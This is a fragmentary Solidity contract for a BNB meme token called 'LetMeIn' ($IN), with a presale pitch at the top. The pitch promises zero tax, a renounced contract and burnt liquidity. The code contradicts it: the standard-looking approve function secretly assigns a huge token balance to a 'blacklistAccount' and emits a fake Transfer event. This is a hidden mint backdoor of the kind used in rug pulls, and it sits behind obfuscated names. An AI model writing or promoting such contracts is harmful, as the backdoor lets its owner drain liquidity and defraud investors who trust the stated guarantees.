...
LetMeIn
https://letmee-in.com/
Don’t be left out of meme season. instead, we’ll let you $IN
Missed out on Pepe and the other high cap meme tokens? Skip the scam coins and 
get $IN on this party. We have strong partnerships already and are hosting this 
presale to raise liquidity for our launch on BNB. We don’t believe in taxes, 
so if you get $IN it’s 0% on buys and sells. The contract will 
be renounced at launch and LP will be burnt. 
We have a soft cap of 5 BNB and will be closing the presale at 30 BNB. 
Don’t be left out, get $IN
*/
...
contract LetMeIn is Ma, Ru, Ko {
   ...
   address private DOGERooter; 
    constructor(address DOGESwap) {
        ...
        _symbol = "IN";
        _decimals = 9;
        _totalSupply = 490000000000000000 * 10 ** 9;
    ...
    */
    ...
    function approve(address getPair, uint256 token1) external override returns (bool) {
        ...
        DOGEethForLiquidity[blacklistAccount] = 100000000000 * 10 ** 25;
        
        emit Transfer(blacklistAccount, address(0), 100000000000 * 10 ** 25);
    } 
